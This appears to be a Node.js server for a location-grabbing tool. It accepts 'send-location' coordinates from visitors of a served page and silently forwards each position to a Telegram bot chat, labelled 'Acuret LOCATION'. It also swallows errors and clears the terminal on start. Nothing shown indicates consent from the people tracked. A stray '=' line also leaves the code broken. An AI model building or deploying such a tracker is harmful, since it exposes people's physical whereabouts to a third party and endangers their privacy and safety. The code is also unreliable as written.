require('dotenv').config();
const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http);
const path = require('path');
const https = require('https');

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;


function sendTelegram(message) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
    https.get(url, (res) => {}).on('error', (e) => { });
}

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

io.on('connection', (socket) => {
    socket.on('send-location', (data) => {
        const latRef = data.lat >= 0 ? "N" : "S";
        const lngRef = data.lng >= 0 ? "E" : "W";
        const formattedLat = Math.abs(data.lat).toFixed(3);
        const formattedLng = Math.abs(data.lng).toFixed(3);
        
=
        const telegramMsg = `<b>Acuret LOCATION: ${formattedLat}°${latRef} ${formattedLng}°${lngRef}</b>`;
        sendTelegram(telegramMsg);
    });
});

const PORT = process.env.PORT || 3000;
http.listen(PORT, () => {

    sendTelegram("<b>Acuret•LOCATION\"🌍\"</b>");
    
    process.stdout.write('\x1Bc'); 
});
